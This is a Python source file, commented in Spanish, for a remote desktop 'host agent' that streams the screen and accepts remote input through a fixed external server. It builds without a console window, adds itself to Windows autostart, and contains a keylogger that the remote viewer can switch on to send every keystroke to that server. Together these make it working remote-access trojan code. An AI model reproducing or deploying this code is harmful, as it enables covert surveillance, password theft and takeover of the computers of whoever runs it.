"""
Remote Desktop — Host Agent
============================
- Lee nombre y contraseña de config.ini (mismo directorio que el exe)
- Si no existe config.ini, lo crea con valores por defecto
- Log en: %LOCALAPPDATA%\\RemoteDesktopHost\\host.log

config.ini:
    [host]
    name = Mi PC
    password = miclave

Build:
    pip install pyinstaller aiortc mss pyautogui python-socketio "aiohttp==3.9.5" pillow numpy av websocket-client pynput
    python -m PyInstaller --onefile --noconsole --name RemoteDesktopHost --hidden-import engineio.async_drivers.aiohttp --hidden-import aiohttp --hidden-import socketio.async_client --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 host_agent.py
"""

import asyncio
import configparser
import hashlib
import logging
import pathlib
import sys
import traceback
import threading
import time

# ── Log ───────────────────────────────────────────────────────────────────────
APP_NAME = "RemoteDesktopHost"
LOG_PATH = pathlib.Path.home() / "AppData" / "Local" / APP_NAME / "host.log"
LOG_PATH.parent.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
    handlers=[logging.FileHandler(LOG_PATH, encoding="utf-8")],
)
log = logging.getLogger("host")
logging.getLogger("aiortc").setLevel(logging.WARNING)
logging.getLogger("aioice").setLevel(logging.INFO)
logging.getLogger("engineio.client").setLevel(logging.WARNING)
logging.getLogger("socketio.client").setLevel(logging.WARNING)
logging.getLogger("asyncio").setLevel(logging.WARNING)

log.info("=" * 50)
log.info("  Remote Desktop Host Agent — iniciando")
log.info("=" * 50)

# ── Config.ini ────────────────────────────────────────────────────────────────
def get_config_path():
    """Devuelve la ruta al config.ini junto al exe o script."""
    if getattr(sys, "frozen", False):
        # Corriendo como exe compilado
        base = pathlib.Path(sys.executable).parent
    else:
        # Corriendo como script .py
        base = pathlib.Path(__file__).parent
    return base / "config.ini"

CONFIG_PATH = get_config_path()

def load_config():
    config = configparser.ConfigParser()
    if CONFIG_PATH.exists():
        config.read(CONFIG_PATH, encoding="utf-8")
        log.info(f"Config cargado desde: {CONFIG_PATH}")
    else:
        # Crear config.ini con valores por defecto
        config["host"] = {
            "name":     "Mi PC",
            "password": "miclave123",
        }
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            config.write(f)
        log.warning(f"config.ini no encontrado — creado con valores por defecto en: {CONFIG_PATH}")
        log.warning("Editá config.ini con el nombre y contraseña correctos y reiniciá el agente.")

    name     = config.get("host", "name",     fallback="Mi PC")
    password = config.get("host", "password", fallback="miclave123")
    return name.strip(), password.strip()

HOST_NAME, HOST_PASSWORD = load_config()
PASSWORD_HASH = hashlib.sha256(HOST_PASSWORD.encode()).hexdigest()

log.info(f"Servidor:  https://remoto-6lit.onrender.com")
log.info(f"Nombre PC: {HOST_NAME}")
log.info(f"Python:    {sys.version}")

# ── Imports ───────────────────────────────────────────────────────────────────
log.info("--- Importando dependencias ---")

try:
    import mss
    log.info("✓ mss OK")
except Exception as e:
    log.error(f"✗ mss: {e}"); sys.exit(1)

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE    = 0
    log.info("✓ pyautogui OK")
except Exception as e:
    log.error(f"✗ pyautogui: {e}"); sys.exit(1)

try:
    import numpy
    log.info("✓ numpy OK")
except Exception as e:
    log.error(f"✗ numpy: {e}"); sys.exit(1)

try:
    from PIL import Image
    log.info("✓ PIL OK")
except Exception as e:
    log.error(f"✗ PIL: {e}"); sys.exit(1)

try:
    import socketio
    log.info("✓ socketio OK")
except Exception as e:
    log.error(f"✗ socketio: {e}"); sys.exit(1)

try:
    import aiohttp
    log.info(f"✓ aiohttp OK (v{aiohttp.__version__})")
except Exception as e:
    log.error(f"✗ aiohttp: {e}"); sys.exit(1)

try:
    from aiortc import (
        RTCPeerConnection, RTCSessionDescription,
        VideoStreamTrack, RTCConfiguration, RTCIceServer
    )
    from aiortc.sdp import candidate_from_sdp
    from av import VideoFrame
    log.info("✓ aiortc + av OK")
except Exception as e:
    log.error(f"✗ aiortc/av: {e}"); sys.exit(1)

try:
    from pynput import keyboard as pynput_keyboard
    log.info("✓ pynput OK")
except Exception as e:
    log.error(f"✗ pynput: {e}"); sys.exit(1)

log.info("--- Todos los imports OK ---")

# ── ICE config ────────────────────────────────────────────────────────────────
SIGNAL_URL = "https://remoto-6lit.onrender.com"
FPS        = 20

RTC_CONFIG = RTCConfiguration(iceServers=[
    RTCIceServer(urls=["stun:stun.l.google.com:19302"]),
    RTCIceServer(urls=["stun:stun1.l.google.com:19302"]),
    RTCIceServer(urls=["stun:stun2.l.google.com:19302"]),
    RTCIceServer(urls=["stun:stun3.l.google.com:19302"]),
])

# ── Autostart ─────────────────────────────────────────────────────────────────
def register_autostart():
    if sys.platform != "win32":
        return
    try:
        import winreg
        exe_path = str(
            pathlib.Path(
                sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
            ).resolve()
        )
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_READ | winreg.KEY_WRITE,
        )
        try:
            current, _ = winreg.QueryValueEx(key, APP_NAME)
        except FileNotFoundError:
            current = None
        if current != exe_path:
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, exe_path)
            log.info(f"Autostart registrado: {exe_path}")
        else:
            log.info("Autostart ya estaba configurado.")
        winreg.CloseKey(key)
    except Exception as e:
        log.warning(f"No se pudo registrar autostart: {e}")


# ── Capture thread ────────────────────────────────────────────────────────────
class CaptureThread(threading.Thread):
    def __init__(self, fps=FPS):
        super().__init__(daemon=True)
        self.fps          = fps
        self.latest_frame = None
        self.lock         = threading.Lock()
        self._stop_event  = threading.Event()

    def run(self):
        interval = 1.0 / self.fps
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            log.info(f"Monitor: {monitor['width']}x{monitor['height']}")
            while not self._stop_event.is_set():
                t0 = time.monotonic()
                try:
                    raw = sct.grab(monitor)
                    img = Image.frombytes("RGB", (raw.width, raw.height), raw.rgb)
                    arr = numpy.array(img)
                    with self.lock:
                        self.latest_frame = arr
                except Exception as e:
                    log.warning(f"Capture error: {e}")
                elapsed = time.monotonic() - t0
                sleep_t = interval - elapsed
                if sleep_t > 0:
                    time.sleep(sleep_t)

    def get_frame(self):
        with self.lock:
            return self.latest_frame

    def stop(self):
        self._stop_event.set()


# ── Screen track ──────────────────────────────────────────────────────────────
class ScreenTrack(VideoStreamTrack):
    kind = "video"

    def __init__(self, capture_thread):
        super().__init__()
        self._capture = capture_thread

    async def recv(self):
        pts, time_base = await self.next_timestamp()
        arr = None
        while arr is None:
            arr = self._capture.get_frame()
            if arr is None:
                await asyncio.sleep(0.01)
        frame           = VideoFrame.from_ndarray(arr, format="rgb24")
        frame.pts       = pts
        frame.time_base = time_base
        return frame


# ── Keylogger ─────────────────────────────────────────────────────────────────
class Keylogger:
    def __init__(self):
        self._listener = None
        self._active   = False
        self._sio      = None
        self._loop     = None

    def start(self, sio, loop):
        if self._active:
            return
        self._sio    = sio
        self._loop   = loop
        self._active = True
        self._listener = pynput_keyboard.Listener(on_press=self._on_press)
        self._listener.start()
        log.info("Keylogger activado.")

    def stop(self):
        if not self._active:
            return
        self._active = False
        if self._listener:
            self._listener.stop()
            self._listener = None
        log.info("Keylogger desactivado.")

    def _on_press(self, key):
        if not self._active or not self._sio or not self._loop:
            return
        try:
            if hasattr(key, "char") and key.char:
                char = key.char
            else:
                name = key.name if hasattr(key, "name") else str(key)
                special_map = {
                    "space": " ", "enter": "\n", "backspace": "[⌫]",
                    "tab": "[TAB]", "caps_lock": "[CAPS]",
                    "shift": "", "shift_r": "", "ctrl_l": "", "ctrl_r": "",
                    "alt_l": "", "alt_r": "", "cmd": "",
                    "delete": "[DEL]", "esc": "[ESC]",
                }
                char = special_map.get(name, f"[{name.upper()}]")
            if char:
                asyncio.run_coroutine_threadsafe(
                    self._sio.emit("keylog:key", {"char": char}),
                    self._loop,
                )
        except Exception as e:
            log.warning(f"Keylogger error: {e}")


# ── Input handler ─────────────────────────────────────────────────────────────
KEY_MAP = {
    "ArrowLeft":"left","ArrowRight":"right","ArrowUp":"up","ArrowDown":"down",
    "Enter":"enter","Backspace":"backspace","Delete":"delete","Escape":"esc",
    "Tab":"tab","CapsLock":"capslock","Home":"home","End":"end",
    "PageUp":"pageup","PageDown":"pagedown","Insert":"insert"," ":"space",
    "F1":"f1","F2":"f2","F3":"f3","F4":"f4","F5":"f5","F6":"f6",
    "F7":"f7","F8":"f8","F9":"f9","F10":"f10","F11":"f11",
    "Control":"ctrl","Shift":"shift","Alt":"alt","Meta":"win",
    "PrintScreen":"printscreen",
}
_pressed = set()


def handle_input(data: dict):
    try:
        t = data.get("type")
        if t == "mousemove":
            pyautogui.moveTo(data["x"], data["y"], duration=0)
        elif t in ("mousedown", "mouseup", "click"):
            btn = {0:"left",1:"middle",2:"right"}.get(data.get("button", 0), "left")
            if   t == "mousedown": pyautogui.mouseDown(data["x"], data["y"], button=btn)
            elif t == "mouseup":   pyautogui.mouseUp(data["x"], data["y"], button=btn)
            else:                  pyautogui.click(data["x"], data["y"], button=btn)
        elif t == "dblclick":
            pyautogui.doubleClick(data["x"], data["y"])
        elif t == "contextmenu":
            pyautogui.rightClick(data["x"], data["y"])
        elif t == "scroll":
            clicks = int(-data.get("deltaY", 0) / 120)
            if clicks: pyautogui.scroll(clicks)
        elif t == "keydown":
            key = _resolve_key(data)
            if key and key not in _pressed:
                _pressed.add(key)
                pyautogui.keyDown(key)
        elif t == "keyup":
            key = _resolve_key(data)
            if key and key in _pressed:
                _pressed.discard(key)
                pyautogui.keyUp(key)
    except Exception as e:
        log.warning(f"Input error ({data.get('type')}): {e}")


def _resolve_key(data):
    raw = data.get("key", "")
    if raw in KEY_MAP: return KEY_MAP[raw]
    if len(raw) == 1:  return raw
    return None


# ── ICE gathering ─────────────────────────────────────────────────────────────
async def wait_for_ice_gathering(pc, timeout=20):
    if pc.iceGatheringState == "complete":
        return
    event = asyncio.Event()

    @pc.on("icegatheringstatechange")
    def on_state():
        if pc.iceGatheringState == "complete":
            event.set()

    try:
        await asyncio.wait_for(event.wait(), timeout=timeout)
        log.info("✓ ICE gathering completo.")
    except asyncio.TimeoutError:
        log.warning("ICE gathering timeout — enviando igual.")


# ── Main ──────────────────────────────────────────────────────────────────────
async def run():
    pc             = None
    capture_thread = None
    keylogger      = Keylogger()
    loop           = asyncio.get_event_loop()

    log.info("Creando cliente Socket.IO...")
    sio = socketio.AsyncClient(
        reconnection=True,
        reconnection_attempts=0,  # infinito
        reconnection_delay=5,
    )

    @sio.event
    async def connect():
        log.info("✓ CONECTADO al servidor de señalización.")
        await sio.emit("host:register", {
            "name":         HOST_NAME,
            "passwordHash": PASSWORD_HASH,
        })
        log.info(f"Registrado como '{HOST_NAME}'. Esperando viewer...")

    @sio.event
    async def connect_error(data):
        log.error(f"✗ Error de conexión: {data}")

    @sio.event
    async def disconnect():
        log.warning("Desconectado del servidor. Reconectando...")
        keylogger.stop()

    @sio.on("host:viewer-joined")
    async def on_viewer_joined():
        nonlocal pc, capture_thread
        log.info("Viewer conectado — iniciando WebRTC...")
        try:
            capture_thread = CaptureThread(fps=FPS)
            capture_thread.start()

            pc = RTCPeerConnection(configuration=RTC_CONFIG)
            log.info("RTCPeerConnection creado.")
            pc.addTrack(ScreenTrack(capture_thread))

            @pc.on("icecandidate")
            async def on_ice(candidate):
                if candidate:
                    await sio.emit("signal:ice", {"candidate": {
                        "candidate":     candidate.candidate,
                        "sdpMid":        candidate.sdpMid,
                        "sdpMLineIndex": candidate.sdpMLineIndex,
                    }})

            @pc.on("icegatheringstatechange")
            def on_gathering():
                log.info(f"ICE gathering: {pc.iceGatheringState}")

            @pc.on("connectionstatechange")
            async def on_state():
                log.info(f"WebRTC estado: {pc.connectionState}")
                if pc.connectionState == "connected":
                    log.info("✓ ¡Stream activo! Viewer viendo la pantalla.")
                elif pc.connectionState == "failed":
                    log.error("✗ WebRTC falló.")

            offer = await pc.createOffer()
            await pc.setLocalDescription(offer)
            await wait_for_ice_gathering(pc, timeout=20)
            await sio.emit("signal:offer", {
                "offer": {"type": pc.localDescription.type, "sdp": pc.localDescription.sdp}
            })
            log.info("SDP offer enviado con ICE candidates incluidos.")

        except Exception as e:
            log.error(f"Error iniciando WebRTC: {e}")
            log.error(traceback.format_exc())

    @sio.on("signal:answer")
    async def on_answer(data):
        if pc:
            try:
                await pc.setRemoteDescription(RTCSessionDescription(**data["answer"]))
                log.info("Remote description seteada — negociando ICE...")
            except Exception as e:
                log.error(f"Error en remote description: {e}")

    @sio.on("signal:ice")
    async def on_ice_remote(data):
        if not pc or not data.get("candidate"): return
        c = data["candidate"]
        try:
            candidate_str = c.get("candidate", "")
            if candidate_str.startswith("candidate:"):
                candidate_str = candidate_str[10:]
            cand = candidate_from_sdp(candidate_str)
            cand.sdpMid        = c.get("sdpMid")
            cand.sdpMLineIndex = c.get("sdpMLineIndex")
            await pc.addIceCandidate(cand)
            log.info(f"ICE remoto agregado: {candidate_str[:60]}...")
        except Exception as e:
            log.warning(f"ICE error: {e}")

    @sio.on("input:event")
    async def on_input(data):
        loop2 = asyncio.get_event_loop()
        await loop2.run_in_executor(None, handle_input, data)

    @sio.on("keylog:start")
    async def on_keylog_start():
        log.info("Viewer activó el keylogger.")
        keylogger.start(sio, loop)

    @sio.on("keylog:stop")
    async def on_keylog_stop():
        log.info("Viewer desactivó el keylogger.")
        keylogger.stop()

    @sio.on("host:viewer-left")
    async def on_viewer_left():
        nonlocal pc, capture_thread
        log.info("Viewer desconectado.")
        keylogger.stop()
        if capture_thread:
            capture_thread.stop()
            capture_thread = None
        if pc:
            await pc.close()
            pc = None

    @sio.on("error")
    async def on_error(data):
        log.error(f"Error del servidor: {data.get('message')}")

    # ── Loop de conexión ──────────────────────────────────────────────────────
    intentos = 0
    while True:
        intentos += 1
        log.info(f"Intento #{intentos} — conectando a {SIGNAL_URL} ...")
        try:
            await sio.connect(
                SIGNAL_URL,
                transports=["polling"],
                wait_timeout=30,
            )
            log.info("Sesión Socket.IO activa.")
            await sio.wait()
        except socketio.exceptions.ConnectionError as e:
            log.error(f"ConnectionError: {e}")
        except Exception as e:
            log.error(f"Error inesperado: {type(e).__name__}: {e}")
            log.error(traceback.format_exc())
        finally:
            keylogger.stop()
            if capture_thread:
                capture_thread.stop()
                capture_thread = None
            if pc:
                await pc.close()
                pc = None
            try:
                await sio.disconnect()
            except Exception:
                pass

        log.info("Reintentando en 10 segundos...")
        await asyncio.sleep(10)


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    register_autostart()
    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        log.info("Agente detenido manualmente.")
    except Exception as e:
        log.error(f"Error fatal: {type(e).__name__}: {e}")
        log.error(traceback.format_exc())
